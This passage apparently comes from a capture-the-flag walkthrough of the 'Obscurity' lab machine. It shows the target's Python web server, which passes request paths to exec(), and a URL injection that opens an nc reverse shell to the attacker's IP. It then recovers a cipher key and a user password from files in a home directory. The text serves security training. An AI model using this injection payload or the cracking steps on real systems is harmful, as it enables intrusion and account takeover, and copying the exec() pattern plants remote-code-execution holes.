				<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> threading
				<span style="color:#f92672">from</span> datetime <span style="color:#f92672">import</span> datetime
				<span style="color:#f92672">import</span> sys
				<span style="color:#f92672">import</span> os
				<span style="color:#f92672">import</span> mimetypes
				<span style="color:#f92672">import</span> urllib.parse
				<span style="color:#f92672">import</span> subprocess
				
				respTemplate <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;HTTP/1.1 {statusNum} {statusCode}
				</span><span style="color:#e6db74">Date: {dateSent}
				</span><span style="color:#e6db74">Server: {server}
				</span><span style="color:#e6db74">Last-Modified: {modified}
				</span><span style="color:#e6db74">Content-Length: {length}
				</span><span style="color:#e6db74">Content-Type: {contentType}
				</span><span style="color:#e6db74">Connection: {connectionType}
				</span><span style="color:#e6db74">
				</span><span style="color:#e6db74">{body}
				</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
				DOC_ROOT <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;DocRoot&#34;</span>
				
				CODES <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;200&#34;</span>: <span style="color:#e6db74">&#34;OK&#34;</span>,
				<span style="color:#e6db74">&#34;304&#34;</span>: <span style="color:#e6db74">&#34;NOT MODIFIED&#34;</span>,
				<span style="color:#e6db74">&#34;400&#34;</span>: <span style="color:#e6db74">&#34;BAD REQUEST&#34;</span>, <span style="color:#e6db74">&#34;401&#34;</span>: <span style="color:#e6db74">&#34;UNAUTHORIZED&#34;</span>, <span style="color:#e6db74">&#34;403&#34;</span>: <span style="color:#e6db74">&#34;FORBIDDEN&#34;</span>, <span style="color:#e6db74">&#34;404&#34;</span>: <span style="color:#e6db74">&#34;NOT FOUND&#34;</span>,
				<span style="color:#e6db74">&#34;500&#34;</span>: <span style="color:#e6db74">&#34;INTERNAL SERVER ERROR&#34;</span>}
				
				MIMES <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;txt&#34;</span>: <span style="color:#e6db74">&#34;text/plain&#34;</span>, <span style="color:#e6db74">&#34;css&#34;</span>:<span style="color:#e6db74">&#34;text/css&#34;</span>, <span style="color:#e6db74">&#34;html&#34;</span>:<span style="color:#e6db74">&#34;text/html&#34;</span>, <span style="color:#e6db74">&#34;png&#34;</span>: <span style="color:#e6db74">&#34;image/png&#34;</span>, <span style="color:#e6db74">&#34;jpg&#34;</span>:<span style="color:#e6db74">&#34;image/jpg&#34;</span>,
				<span style="color:#e6db74">&#34;ttf&#34;</span>:<span style="color:#e6db74">&#34;application/octet-stream&#34;</span>,<span style="color:#e6db74">&#34;otf&#34;</span>:<span style="color:#e6db74">&#34;application/octet-stream&#34;</span>, <span style="color:#e6db74">&#34;woff&#34;</span>:<span style="color:#e6db74">&#34;font/woff&#34;</span>, <span style="color:#e6db74">&#34;woff2&#34;</span>: <span style="color:#e6db74">&#34;font/woff2&#34;</span>,
				<span style="color:#e6db74">&#34;js&#34;</span>:<span style="color:#e6db74">&#34;application/javascript&#34;</span>,<span style="color:#e6db74">&#34;gz&#34;</span>:<span style="color:#e6db74">&#34;application/zip&#34;</span>, <span style="color:#e6db74">&#34;py&#34;</span>:<span style="color:#e6db74">&#34;text/plain&#34;</span>, <span style="color:#e6db74">&#34;map&#34;</span>: <span style="color:#e6db74">&#34;application/octet-stream&#34;</span>}
				
				
				<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Response</span>:
				<span style="color:#66d9ef">def</span> __init__(self, <span style="color:#f92672">**</span>kwargs):
				self<span style="color:#f92672">.</span>__dict__<span style="color:#f92672">.</span>update(kwargs)
				now <span style="color:#f92672">=</span> datetime<span style="color:#f92672">.</span>now()
				self<span style="color:#f92672">.</span>dateSent <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>modified <span style="color:#f92672">=</span> now<span style="color:#f92672">.</span>strftime(<span style="color:#e6db74">&#34;%a, </span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> %b %Y %H:%M:%S&#34;</span>)
				<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">stringResponse</span>(self):
				<span style="color:#66d9ef">return</span> respTemplate<span style="color:#f92672">.</span>format(<span style="color:#f92672">**</span>self<span style="color:#f92672">.</span>__dict__)
				
				<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Request</span>:
				<span style="color:#66d9ef">def</span> __init__(self, request):
				self<span style="color:#f92672">.</span>good <span style="color:#f92672">=</span> True
				<span style="color:#66d9ef">try</span>:
				request <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>parseRequest(request)
				self<span style="color:#f92672">.</span>method <span style="color:#f92672">=</span> request[<span style="color:#e6db74">&#34;method&#34;</span>]
				self<span style="color:#f92672">.</span>doc <span style="color:#f92672">=</span> request[<span style="color:#e6db74">&#34;doc&#34;</span>]
				self<span style="color:#f92672">.</span>vers <span style="color:#f92672">=</span> request[<span style="color:#e6db74">&#34;vers&#34;</span>]
				self<span style="color:#f92672">.</span>header <span style="color:#f92672">=</span> request[<span style="color:#e6db74">&#34;header&#34;</span>]
				self<span style="color:#f92672">.</span>body <span style="color:#f92672">=</span> request[<span style="color:#e6db74">&#34;body&#34;</span>]
				<span style="color:#66d9ef">except</span>:
				self<span style="color:#f92672">.</span>good <span style="color:#f92672">=</span> False
				
				<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parseRequest</span>(self, request):
				req <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
				method,doc,vers <span style="color:#f92672">=</span> req[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34; &#34;</span>)
				header <span style="color:#f92672">=</span> req[<span style="color:#ae81ff">1</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>]
				body <span style="color:#f92672">=</span> req[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
				headerDict <span style="color:#f92672">=</span> {}
				<span style="color:#66d9ef">for</span> param <span style="color:#f92672">in</span> header:
				pos <span style="color:#f92672">=</span> param<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;: &#34;</span>)
				key, val <span style="color:#f92672">=</span> param[:pos], param[pos<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>:]
				headerDict<span style="color:#f92672">.</span>update({key: val})
				<span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#34;method&#34;</span>: method, <span style="color:#e6db74">&#34;doc&#34;</span>: doc, <span style="color:#e6db74">&#34;vers&#34;</span>: vers, <span style="color:#e6db74">&#34;header&#34;</span>: headerDict, <span style="color:#e6db74">&#34;body&#34;</span>: body}
				
				
				<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Server</span>:
				<span style="color:#66d9ef">def</span> __init__(self, host, port):
				self<span style="color:#f92672">.</span>host <span style="color:#f92672">=</span> host
				self<span style="color:#f92672">.</span>port <span style="color:#f92672">=</span> port
				self<span style="color:#f92672">.</span>sock <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
				self<span style="color:#f92672">.</span>sock<span style="color:#f92672">.</span>setsockopt(socket<span style="color:#f92672">.</span>SOL_SOCKET, socket<span style="color:#f92672">.</span>SO_REUSEADDR, <span style="color:#ae81ff">1</span>)
				self<span style="color:#f92672">.</span>sock<span style="color:#f92672">.</span>bind((self<span style="color:#f92672">.</span>host, self<span style="color:#f92672">.</span>port))
				
				<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">listen</span>(self):
				self<span style="color:#f92672">.</span>sock<span style="color:#f92672">.</span>listen(<span style="color:#ae81ff">5</span>)
				<span style="color:#66d9ef">while</span> True:
				client, address <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>sock<span style="color:#f92672">.</span>accept()
				client<span style="color:#f92672">.</span>settimeout(<span style="color:#ae81ff">60</span>)
				threading<span style="color:#f92672">.</span>Thread(target <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>listenToClient,args <span style="color:#f92672">=</span> (client,address))<span style="color:#f92672">.</span>start()
				
				<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">listenToClient</span>(self, client, address):
				size <span style="color:#f92672">=</span> <span style="color:#ae81ff">1024</span>
				<span style="color:#66d9ef">while</span> True:
				<span style="color:#66d9ef">try</span>:
				data <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>recv(size)
				<span style="color:#66d9ef">if</span> data:
				<span style="color:#75715e"># Set the response to echo back the recieved data </span>
				req <span style="color:#f92672">=</span> Request(data<span style="color:#f92672">.</span>decode())
				self<span style="color:#f92672">.</span>handleRequest(req, client, address)
				client<span style="color:#f92672">.</span>shutdown()
				client<span style="color:#f92672">.</span>close()
				<span style="color:#66d9ef">else</span>:
				<span style="color:#66d9ef">raise</span> error(<span style="color:#e6db74">&#39;Client disconnected&#39;</span>)
				<span style="color:#66d9ef">except</span>:
				client<span style="color:#f92672">.</span>close()
				<span style="color:#66d9ef">return</span> False
				
				<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">handleRequest</span>(self, request, conn, address):
				<span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>good:
				<span style="color:#75715e">#            try:</span>
				<span style="color:#75715e"># print(str(request.method) + &#34; &#34; + str(request.doc), end=&#39; &#39;)</span>
				<span style="color:#75715e"># print(&#34;from {0}&#34;.format(address[0]))</span>
				<span style="color:#75715e">#            except Exception as e:</span>
				<span style="color:#75715e">#                print(e)</span>
				document <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>serveDoc(request<span style="color:#f92672">.</span>doc, DOC_ROOT)
				statusNum<span style="color:#f92672">=</span>document[<span style="color:#e6db74">&#34;status&#34;</span>]
				<span style="color:#66d9ef">else</span>:
				document <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>serveDoc(<span style="color:#e6db74">&#34;/errors/400.html&#34;</span>, DOC_ROOT)
				statusNum<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;400&#34;</span>
				body <span style="color:#f92672">=</span> document[<span style="color:#e6db74">&#34;body&#34;</span>]
				
				statusCode<span style="color:#f92672">=</span>CODES[statusNum]
				dateSent <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
				server <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;BadHTTPServer&#34;</span>
				modified <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
				length <span style="color:#f92672">=</span> len(body)
				contentType <span style="color:#f92672">=</span> document[<span style="color:#e6db74">&#34;mime&#34;</span>] <span style="color:#75715e"># Try and identify MIME type from string</span>
				connectionType <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Closed&#34;</span>
				
				
				resp <span style="color:#f92672">=</span> Response(
				statusNum<span style="color:#f92672">=</span>statusNum, statusCode<span style="color:#f92672">=</span>statusCode,
				dateSent <span style="color:#f92672">=</span> dateSent, server <span style="color:#f92672">=</span> server,
				modified <span style="color:#f92672">=</span> modified, length <span style="color:#f92672">=</span> length,
				contentType <span style="color:#f92672">=</span> contentType, connectionType <span style="color:#f92672">=</span> connectionType,
				body <span style="color:#f92672">=</span> body
				)
				
				data <span style="color:#f92672">=</span> resp<span style="color:#f92672">.</span>stringResponse()
				<span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> data:
				<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
				conn<span style="color:#f92672">.</span>send(data<span style="color:#f92672">.</span>encode())
				<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>
				
				<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">serveDoc</span>(self, path, docRoot):
				path <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>unquote(path)
				<span style="color:#66d9ef">try</span>:
				info <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;output = &#39;Document: {}&#39;&#34;</span> <span style="color:#75715e"># Keep the output for later debug</span>
				<span style="color:#66d9ef">print</span>(info<span style="color:#f92672">.</span>format(path))
				<span style="color:#66d9ef">exec</span>(info<span style="color:#f92672">.</span>format(path)) <span style="color:#75715e"># This is how you do string formatting, right?</span>
				cwd <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>dirname(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>realpath(__file__))
				docRoot <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(cwd, docRoot)
				<span style="color:#66d9ef">if</span> path <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;/&#34;</span>:
				path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/index.html&#34;</span>
				requested <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(docRoot, path[<span style="color:#ae81ff">1</span>:])
				<span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isfile(requested):
				mime <span style="color:#f92672">=</span> mimetypes<span style="color:#f92672">.</span>guess_type(requested)
				mime <span style="color:#f92672">=</span> (mime <span style="color:#66d9ef">if</span> mime[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">!=</span> None <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#34;text/html&#34;</span>)
				mime <span style="color:#f92672">=</span> MIMES[requested<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;.&#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]]
				<span style="color:#66d9ef">try</span>:
				<span style="color:#66d9ef">with</span> open(requested, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
				data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
				<span style="color:#66d9ef">except</span>:
				<span style="color:#66d9ef">with</span> open(requested, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
				data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
				status <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;200&#34;</span>
				<span style="color:#66d9ef">else</span>:
				errorPage <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(docRoot, <span style="color:#e6db74">&#34;errors&#34;</span>, <span style="color:#e6db74">&#34;404.html&#34;</span>)
				mime <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;text/html&#34;</span>
				<span style="color:#66d9ef">with</span> open(errorPage, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
				data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>format(path)
				status <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;404&#34;</span>
				<span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
				<span style="color:#66d9ef">print</span>(e)
				errorPage <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(docRoot, <span style="color:#e6db74">&#34;errors&#34;</span>, <span style="color:#e6db74">&#34;500.html&#34;</span>)
				mime <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;text/html&#34;</span>
				<span style="color:#66d9ef">with</span> open(errorPage, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
				data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
				status <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;500&#34;</span>
				<span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#34;body&#34;</span>: data, <span style="color:#e6db74">&#34;mime&#34;</span>: mime, <span style="color:#e6db74">&#34;status&#34;</span>: status}
				</code></pre></div><p>By doing some code-analysis, is possible to see that the function <code>serveDoc()</code> is vulnerable to a command injection in its line <code>exec(info.format(path)) # This is how you do string formatting, right?</code> this is because it&rsquo;s making use of <a href="https://docs.python.org/2.0/ref/exec.html">exec</a> which is not even being sanitized, so in other words&hellip;there is being used a function which executes stuff at OS level while not sanitized, so this is our RCE :)</p>
				<p>Pst: The hyperlink against the doc of <code>exec</code> points to 2.0 because when I did this machine, python 2.x was still alive, and then I just went to read of exec on that version.</p>
				<h2 id="rce">RCE</h2>
				<p>Knowing that the webserver is vulnerable to a command injection, I started to do some trial/error in differents ways, after some time and a little POC I ended getting a reverse shell by executing:</p>
				<pre><code class="language-console" data-lang="console">http://10.10.10.168:8080/';os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.16 4444 &gt;/tmp/f');'
				</code></pre>
				<img src="/images/htb/obscurity/1-rce.png"  class="center"  style="border-radius: 8px;"  />
				
				
				<h2 id="user">user</h2>
				<p>Once inside a reverse, I start doing some normal linux enumeration, after a few minutes I see there is a user called <code>robert</code> and I list the contents of it&rsquo;s home:</p>
				<pre><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ ls -la /home/robert
				total 60
				drwxr-xr-x 7 robert robert 4096 Dec  2 09:53 .
				drwxr-xr-x 3 root   root   4096 Sep 24 22:09 ..
				lrwxrwxrwx 1 robert robert    9 Sep 28 23:28 .bash_history -&gt; /dev/null
				-rw-r--r-- 1 robert robert  220 Apr  4  2018 .bash_logout
				-rw-r--r-- 1 robert robert 3771 Apr  4  2018 .bashrc
				drwx------ 2 robert robert 4096 Oct  5 13:09 BetterSSH
				drwx------ 2 robert robert 4096 Oct  3 16:02 .cache
				-rw-rw-r-- 1 robert robert   94 Sep 26 23:08 check.txt
				drwxr-x--- 3 robert robert 4096 Dec  2 09:53 .config
				drwx------ 3 robert robert 4096 Oct  3 22:42 .gnupg
				drwxrwxr-x 3 robert robert 4096 Oct  3 16:34 .local
				-rw-rw-r-- 1 robert robert  185 Oct  4 15:01 out.txt
				-rw-rw-r-- 1 robert robert   27 Oct  4 15:01 passwordreminder.txt
				-rw-r--r-- 1 robert robert  807 Apr  4  2018 .profile
				-rwxrwxr-x 1 robert robert 2514 Oct  4 14:55 SuperSecureCrypt.py
				-rwx------ 1 robert robert   33 Sep 25 14:12 user.txt
				</code></pre><p>So, we need to compromise <code>robert</code> and in it&rsquo;s home lies the path&hellip;in the ls is possible to see some interesting files/directorys: <code>BetterSSH</code>, <code>SuperSecureCrypt.py</code>, <code>out.txt</code>, <code>check.txt</code> and <code>passwordreminder.txt</code>, we start by checking the content of everything:</p>
				<p>First, the directory BetterSSH looks interesting, but we can&rsquo;t see what&rsquo;s inside, so let&rsquo;s take note of this as might come handy later.</p>
				<p><code>check.txt</code> has an interesting message:</p>
				<pre><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ cat check.txt
				Encrypting this file with your key should result in out.txt, make sure your key is correct!
				</code></pre><p><code>out.txt</code> looks like a ciphered message&hellip;(and from the content of <code>check.txt</code> we know they are related)</p>
				<pre><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ file out.txt
				out.txt: UTF-8 Unicode text, with NEL line terminators
				www-data@obscure:/home/robert$ cat out.txt
				¦ÚÈêÚÞØÛÝÝ×ÐÊßÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐêÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäèÎÍÚÎëÑÓäáÛÌ×v
				</code></pre><p>Same with <code>passwordreminder.txt</code>:</p>
				<pre><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ file passwordreminder.txt
				passwordreminder.txt: UTF-8 Unicode text, with no line terminators
				www-data@obscure:/home/robert$ cat passwordreminder.txt
				´ÑÈÌÉàÙÁÑé¯·¿k
				</code></pre><p>And finally, the code of <code>SuperSecureCrypt.py</code>:</p>
				<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> sys
				<span style="color:#f92672">import</span> argparse
				
				<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encrypt</span>(text, key):
				keylen <span style="color:#f92672">=</span> len(key)
				keyPos <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
				encrypted <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
				<span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> text:
				keyChr <span style="color:#f92672">=</span> key[keyPos]
				newChr <span style="color:#f92672">=</span> ord(x)
				newChr <span style="color:#f92672">=</span> chr((newChr <span style="color:#f92672">+</span> ord(keyChr)) <span style="color:#f92672">%</span> <span style="color:#ae81ff">255</span>)
				encrypted <span style="color:#f92672">+=</span> newChr
				keyPos <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
				keyPos <span style="color:#f92672">=</span> keyPos <span style="color:#f92672">%</span> keylen
				<span style="color:#66d9ef">return</span> encrypted
				
				<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt</span>(text, key):
				keylen <span style="color:#f92672">=</span> len(key)
				keyPos <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
				decrypted <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
				<span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> text:
				keyChr <span style="color:#f92672">=</span> key[keyPos]
				newChr <span style="color:#f92672">=</span> ord(x)
				newChr <span style="color:#f92672">=</span> chr((newChr <span style="color:#f92672">-</span> ord(keyChr)) <span style="color:#f92672">%</span> <span style="color:#ae81ff">255</span>)
				decrypted <span style="color:#f92672">+=</span> newChr
				keyPos <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
				keyPos <span style="color:#f92672">=</span> keyPos <span style="color:#f92672">%</span> keylen
				<span style="color:#66d9ef">return</span> decrypted
				
				parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser(description<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Encrypt with 0bscura</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">s encryption algorithm&#39;</span>)
				
				parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-i&#39;</span>,
				metavar<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;InFile&#39;</span>,
				type<span style="color:#f92672">=</span>str,
				help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;The file to read&#39;</span>,
				required<span style="color:#f92672">=</span>False)
				
				parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-o&#39;</span>,
				metavar<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;OutFile&#39;</span>,
				type<span style="color:#f92672">=</span>str,
				help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Where to output the encrypted/decrypted file&#39;</span>,
				required<span style="color:#f92672">=</span>False)
				
				parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-k&#39;</span>,
				metavar<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Key&#39;</span>,
				type<span style="color:#f92672">=</span>str,
				help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Key to use&#39;</span>,
				required<span style="color:#f92672">=</span>False)
				
				parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-d&#39;</span>, action<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;store_true&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Decrypt mode&#39;</span>)
				
				args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
				
				banner <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;################################</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
				banner<span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;#           BEGINNING          #</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
				banner<span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;#    SUPER SECURE ENCRYPTOR    #</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
				banner<span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;################################</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
				banner <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;  ############################</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
				banner <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;  #        FILE MODE         #</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
				banner <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;  ############################&#34;</span>
				<span style="color:#66d9ef">print</span>(banner)
				<span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>o <span style="color:#f92672">==</span> None <span style="color:#f92672">or</span> args<span style="color:#f92672">.</span>k <span style="color:#f92672">==</span> None <span style="color:#f92672">or</span> args<span style="color:#f92672">.</span>i <span style="color:#f92672">==</span> None:
				<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Missing args&#34;</span>)
				<span style="color:#66d9ef">else</span>:
				<span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>d:
				<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Opening file {0}...&#34;</span><span style="color:#f92672">.</span>format(args<span style="color:#f92672">.</span>i))
				<span style="color:#66d9ef">with</span> open(args<span style="color:#f92672">.</span>i, <span style="color:#e6db74">&#39;r&#39;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;UTF-8&#39;</span>) <span style="color:#66d9ef">as</span> f:
				data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
				
				<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Decrypting...&#34;</span>)
				decrypted <span style="color:#f92672">=</span> decrypt(data, args<span style="color:#f92672">.</span>k)
				
				<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Writing to {0}...&#34;</span><span style="color:#f92672">.</span>format(args<span style="color:#f92672">.</span>o))
				<span style="color:#66d9ef">with</span> open(args<span style="color:#f92672">.</span>o, <span style="color:#e6db74">&#39;w&#39;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;UTF-8&#39;</span>) <span style="color:#66d9ef">as</span> f:
				f<span style="color:#f92672">.</span>write(decrypted)
				<span style="color:#66d9ef">else</span>:
				<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Opening file {0}...&#34;</span><span style="color:#f92672">.</span>format(args<span style="color:#f92672">.</span>i))
				<span style="color:#66d9ef">with</span> open(args<span style="color:#f92672">.</span>i, <span style="color:#e6db74">&#39;r&#39;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;UTF-8&#39;</span>) <span style="color:#66d9ef">as</span> f:
				data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
				
				<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Encrypting...&#34;</span>)
				encrypted <span style="color:#f92672">=</span> encrypt(data, args<span style="color:#f92672">.</span>k)
				
				<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Writing to {0}...&#34;</span><span style="color:#f92672">.</span>format(args<span style="color:#f92672">.</span>o))
				<span style="color:#66d9ef">with</span> open(args<span style="color:#f92672">.</span>o, <span style="color:#e6db74">&#39;w&#39;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;UTF-8&#39;</span>) <span style="color:#66d9ef">as</span> f:
				f<span style="color:#f92672">.</span>write(encrypted)
				</code></pre></div><p>By analyzing what the code does, one can see that it takes a file as input and a key and ciphers that file, is possible to observe as well we can provide a ciphered file and it&rsquo;s correspondant plain text file in decrypt mode as key, which will give back the key that was used&hellip;
				Then we proceed to execute the script with <code>out.txt</code> as input and <code>check.txt</code> as the key, saving the output (the key), under tmp as <code>foobar</code>:</p>
				<pre><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i out.txt -k &quot;$( cat check.txt )&quot; -o /tmp/foobar -d
				################################
				#           BEGINNING          #
				#    SUPER SECURE ENCRYPTOR    #
				################################
				############################
				#        FILE MODE         #
				############################
				Opening file out.txt...
				Decrypting...
				Writing to /tmp/foobar...
				
				www-data@obscure:/home/robert$ cat /tmp/foobar
				cat /tmp/foobar
				alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichai
				</code></pre><p>Now, we are able to decipher <code>passwordreminder.txt</code> providing the key we got before, getting then the content of <code>passwordreminder.txt</code> and highly likely the password of the user itself:</p>
				<pre><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i passwordreminder.txt -k 'alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichai' -o /tmp/pass -d
				################################
				#           BEGINNING          #
				#    SUPER SECURE ENCRYPTOR    #
				################################
				############################
				#        FILE MODE         #
				############################
				Opening file passwordreminder.txt...
				Decrypting...
				Writing to /tmp/pass...
				www-data@obscure:/home/robert$ cat /tmp/pass
				cat /tmp/pass
				SecThruObsFTW
				</code></pre><p>Now we try to do <code>su - robert</code> with the retrived password, and we are <code>robert</code> :)</p>
				<pre><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ cat /tmp/pass
				cat /tmp/pass
				SecThruObsFTW
				www-data@obscure:/home/robert$ su - robert
				su - robert
